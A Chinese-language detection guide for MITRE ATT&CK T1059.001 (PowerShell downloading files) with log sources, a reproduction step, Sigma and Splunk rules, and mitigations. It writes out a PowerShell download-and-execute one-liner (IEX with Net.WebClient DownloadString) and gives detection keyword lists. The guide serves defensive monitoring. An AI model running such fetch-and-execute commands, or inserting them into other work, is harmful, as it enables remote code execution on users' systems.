# T1059-001-Win-检测Powershell下载文件

## 描述

攻击者可能滥用PowerShell执行命令和脚本，以实现信息发现、恶意代码执行或横向移动（T1059.001）。PowerShell是Windows操作系统内置的强大命令行和脚本环境，支持本地和远程操作。攻击者常利用PowerShell从互联网下载恶意文件（如脚本、可执行文件），并在磁盘或内存中执行，规避传统安全检测。常见的下载方法包括使用`Net.WebClient`、`Invoke-WebRequest`、`Start-BitsTransfer`等 cmdlet，或通过`Invoke-Expression`（IEX）直接执行远程脚本。

PowerShell下载文件的典型特征是命令行中包含HTTP/HTTPS URL或特定的下载函数调用。攻击者可能结合内存执行技术（如`Invoke-Shellcode`）或压缩/编码技术，进一步隐藏恶意行为。由于PowerShell是合法工具，其行为可能被误认为是正常操作，增加检测难度。

## 测试案例

1. **下载并执行远程脚本**  
   攻击者使用`IEX`和`Net.WebClient.DownloadString`从远程服务器下载并执行恶意脚本。

2. **下载可执行文件**  
   攻击er通过`Invoke-WebRequest`或`Net.WebClient.DownloadFile`下载恶意可执行文件到本地磁盘。

## 检测日志

**Windows PowerShell日志**  
- **Microsoft-Windows-PowerShell/Operational**：记录PowerShell命令执行和脚本块信息。  
  - 事件ID 4103：记录模块日志和命令执行。  
  - 事件ID 4104：记录脚本块执行，包含下载命令的详细信息。

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含`powershell.exe`的命令行参数。

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`powershell.exe`的完整命令行和父进程信息。  
- **事件ID 3**：记录网络连接，可能涉及PowerShell发起的HTTP请求。  
- **事件ID 11**：记录文件创建，可能涉及下载的文件写入磁盘。

**配置日志记录**  
- 启用PowerShell日志：  
  - 打开`gpedit.msc`：`计算机配置 > 管理模板 > Windows组件 > Windows PowerShell`。  
  - 启用“启用模块日志记录”、“启用脚本块日志记录”和“启用脚本执行日志记录”。  
- 启用命令行参数记录：`本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 部署Sysmon以增强进程和网络活动监控。

## 测试复现

### 环境准备
- **靶机**：Windows 7/10/2016，安装PowerShell（默认包含）。  
- **日志**：配置Sysmon、Windows安全日志和PowerShell日志。  
- **权限**：测试账户需具备本地权限。  
- **网络**：确保靶机可访问互联网或测试服务器。

### 攻击步骤

```powershell
PS C:\Users\12306br0> IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/details/89361287')
```

## 测试留痕

```yml
Powershell事件ID：4104
正在创建 Scriptblock 文本(已完成 1，共 1):
IEX (New-Object System.Net.Webclient).DownloadString('http://blog.csdn.net/huangxvhui88/article/details/89361287')

ScriptBlock ID: e9f29288-34e7-497f-8fff-9a6cf6c355da
```

## 检测规则/思路

**检测规则**  
通过分析PowerShell日志、Sysmon和Windows安全日志，检测PowerShell下载文件的异常行为。以下是具体思路：

1. **日志分析**：
   - 收集PowerShell日志（事件ID 4104），提取包含下载函数（如`Net.WebClient`、`Invoke-WebRequest`）或HTTP URL的脚本块。  
   - 收集Sysmon事件ID 1或Windows安全事件ID 4688，检测`powershell.exe`或`powershell_ise.exe`的命令行中包含下载相关关键字。  
   - 监控Sysmon事件ID 3，检测PowerShell发起的HTTP/HTTPS连接。

2. **Sigma规则（进程创建）**：
   ```yaml
   title: 检测PowerShell下载文件行为
   id: 6c7d8e0f-7a3b-4c2d-b9f8-4e5f6c7e8f9a
   status: stable
   description: 检测PowerShell执行下载文件的行为，可能表明恶意脚本执行
   references:
     - https://attack.mitre.org/techniques/T1059/001/
     - https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/PowerShell%20downloads.txt
   tags:
     - attack.execution
     - attack.t1059.001
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       Image|endswith:
         - '\powershell.exe'
         - '\powershell_ise.exe'
       CommandLine|contains:
         - 'Net.WebClient'
         - 'DownloadFile'
         - 'DownloadString'
         - 'Invoke-WebRequest'
         - 'Start-BitsTransfer'
         - 'IEX'
         - 'http'
     condition: selection
   falsepositives:
     - 合法的软件更新或脚本下载
     - 管理员运行的维护脚本
   level: medium
   ```

3. **Sigma规则（PowerShell日志）**：
   ```yaml
   title: 检测PowerShell脚本块下载行为
   id: 7d8e9f0a-8b4c-4d3e-c0a9-5f6a7d8f9a0b
   status: stable
   description: 检测PowerShell脚本块中包含下载行为的命令
   logsource:
     product: windows
     service: powershell
   detection:
     selection:
       EventID: 4104
       ScriptBlockText|contains:
         - 'Net.WebClient'
         - 'DownloadFile'
         - 'DownloadString'
         - 'Invoke-WebRequest'
         - 'Start-BitsTransfer'
         - 'IEX'
         - 'http'
     condition: selection
   falsepositives:
     - 合法的脚本下载（如软件更新）
     - 开发或测试环境的正常行为
   level: medium
   ```

4. **SIEM规则**：
   - 检测PowerShell下载行为的进程创建和网络活动。
   - 示例Splunk查询（Sysmon）：
     ```spl
     source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image IN ("*\\powershell.exe", "*\\powershell_ise.exe") (CommandLine="*Net.WebClient*" OR CommandLine="*DownloadFile*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*Start-BitsTransfer*" OR CommandLine="*IEX*" OR CommandLine="*http*") | stats count by Image, CommandLine, ComputerName, User
     ```
   - 示例Splunk查询（PowerShell日志）：
     ```spl
     source="Microsoft-Windows-PowerShell/Operational" EventCode=4104 (ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*DownloadFile*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*Invoke-WebRequest*" OR ScriptBlockText="*Start-BitsTransfer*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*http*") | stats count by ScriptBlockText, ComputerName, User
     ```

5. **网络流量分析**：
   - 监控PowerShell发起的HTTP/HTTPS请求，检测可疑URL。  
   - 示例Wireshark过滤器：
     ```plaintext
     http.request and ip.src == <target_ip> and http.request.uri contains ".ps1"
     ```

6. **威胁情报整合**：
   - 检查PowerShell访问的URL或下载文件的哈希值是否与已知恶意活动相关，结合威胁情报平台（如VirusTotal、AlienVault）。

## 建议

### 缓解措施

防御PowerShell下载文件的恶意行为需从系统加固、权限控制和监控入手：

1. **限制PowerShell执行**  
   - 配置PowerShell执行策略，限制未签名脚本运行：  
     ```powershell
     Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned
     ```
   - 使用AppLocker限制`powershell.exe`和`powershell_ise.exe`的执行。

2. **禁用不必要的PowerShell功能**  
   - 禁用PowerShell 2.0（Windows功能中禁用“Windows PowerShell 2.0引擎”）：  
     ```cmd
     dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2
     ```

3. **启用AMSI和日志记录**  
   - 确保反恶意软件扫描接口（AMSI）启用，检测恶意脚本执行。  
   - 启用PowerShell模块日志记录、脚本块日志记录和脚本执行日志记录。

4. **网络访问控制**  
   - 配置防火墙，限制PowerShell的出站HTTP/HTTPS连接，仅允许白名单域名。  
   - 使用代理服务器监控和过滤PowerShell的网络流量。

5. **凭据保护**  
   - 启用多因素认证（MFA）保护管理员账户。  
   - 实施强密码策略，避免凭据泄露。

6. **日志和监控**  
   - 启用PowerShell日志（事件ID 4103/4104）、Sysmon日志（事件ID 1/3/11）和命令行参数记录（事件ID 4688）。  
   - 配置SIEM检测PowerShell下载相关的命令和网络活动。

### 检测

检测工作应集中在PowerShell下载文件的行为上，包括但不限于：  
- **脚本块监控**：分析PowerShell日志（事件ID 4104），检测包含下载函数或URL的脚本块。  
- **进程行为监控**：分析Sysmon或Windows安全日志，检测`powershell.exe`的下载相关命令行参数。  
- **网络流量监控**：检查PowerShell发起的HTTP/HTTPS请求，识别可疑URL。  
- **行为分析**：通过EDR检测PowerShell下载后的异常活动（如文件执行、网络连接）。  
- **威胁情报整合**：结合威胁情报，检查下载的URL或文件是否与已知恶意活动相关。

## 参考推荐

- MITRE ATT&CK: T1059.001  
  <https://attack.mitre.org/techniques/T1059/001/>  
- PowerShell 下载文件  
  <https://www.pstips.net/powershell-download-files.html>  
- 检测PowerShell下载文件行为  
  <https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/PowerShell%20downloads.txt>  
- PowerShell与威胁狩猎  
  <https://www.freebuf.com/articles/terminal/267080.html>